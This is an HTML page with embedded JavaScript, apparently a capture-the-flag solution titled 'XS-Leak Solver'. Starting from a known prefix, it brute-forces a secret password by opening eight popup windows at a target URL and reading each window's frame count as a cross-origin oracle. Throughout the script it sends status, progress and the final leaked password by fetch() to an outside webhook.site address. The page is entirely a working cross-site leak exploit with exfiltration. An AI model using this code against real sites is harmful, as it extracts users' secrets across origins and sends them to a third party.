<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak Solver - Continue</title>
</head>
<body>
    <h1>Password Leak - Continue from Known</h1>
    <pre id="output"></pre>
    
    <script>
        const TARGET = 'https://127.0.0.1:9999/';
        const WEBHOOK = 'https://webhook.site/a408d71b-0cc8-4104-a331-ccd4889d5836/';
        const CHARSET = '0123456789abcdef';

        function log(msg) {
            document.getElementById('output').textContent += msg + '\n';
        }

        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        const waitFor = async (f, timeout = 2000) => {
            const start = Date.now();
            while (true) {
                if (await f()) return true;
                if (Date.now() - start > timeout) return false;
                await sleep(5);
            }
        };

        // Open 8 windows for parallel testing
        const windows = [];
        for (let i = 0; i < 8; i++) {
            windows.push(window.open('about:blank'));
        }

        if (windows.some(w => !w)) {
            alert('Popup blocked! Please allow popups.');
            throw new Error('Popup blocked');
        }

        log(`Opened ${windows.length} windows\n`);

        async function checkWithWindow(win, candidate) {
            try {
                win.location = 'about:blank';
                await waitFor(() => win.length === 0, 700);
                await sleep(20);
                
                win.location = TARGET + '?pass=' + encodeURIComponent(candidate);
                
                await waitFor(() => {
                    try { win.origin; return false; } 
                    catch { return true; }
                }, 1200);
                
                await sleep(60);
                return win.length > 0;
            } catch (e) {
                return false;
            }
        }

        async function testBatch(known, startIdx) {
            const batch = [];
            const promises = [];
            
            for (let i = 0; i < 8 && (startIdx + i) < CHARSET.length; i++) {
                const c = CHARSET[startIdx + i];
                batch.push(c);
                promises.push(checkWithWindow(windows[i], known + c));
            }
            
            log(`  Testing [${batch.join(' ')}]`);
            const results = await Promise.all(promises);
            
            for (let i = 0; i < results.length; i++) {
                if (results[i]) {
                    return batch[i];
                }
            }
            return null;
        }

        async function attack() {
            // UPDATE THIS LINE with the known prefix from previous run
            let known = 'lebah2e2044';  // Change this each run
            const charsGot = known.length - 5;  // Subtract 'lebah'
            const charsNeeded = 12 - charsGot;
            
            log(`Continuing from: ${known}`);
            log(`Already have: ${charsGot}/12 chars`);
            log(`Need: ${charsNeeded} more chars\n`);
            
            fetch(WEBHOOK + '?status=continue').catch(e => {});
            
            for (let pos = 0; pos < charsNeeded; pos++) {
                log(`Position ${charsGot + pos + 1}/12:`);
                let found = false;
                
                for (let i = 0; i < CHARSET.length; i += 8) {
                    const char = await testBatch(known, i);
                    if (char) {
                        known += char;
                        log(`  Found: '${char}' -> ${known}\n`);
                        fetch(WEBHOOK + '?progress=' + known).catch(e => {});
                        found = true;
                        break;
                    }
                }
                
                if (!found) {
                    log(`  No match found\n`);
                    break;
                }
            }
            
            log('\n' + '='.repeat(40));
            log(`LEAKED PASSWORD: ${known}`);
            log(`Progress: ${known.length - 5}/12 chars leaked`);
            log('='.repeat(40));
            fetch(WEBHOOK + '?password=' + known).catch(e => {});
            
            windows.forEach(w => {
                if (w && !w.closed) w.close();
            });
        }

        setTimeout(attack, 500);
    </script>
</body>
</html>
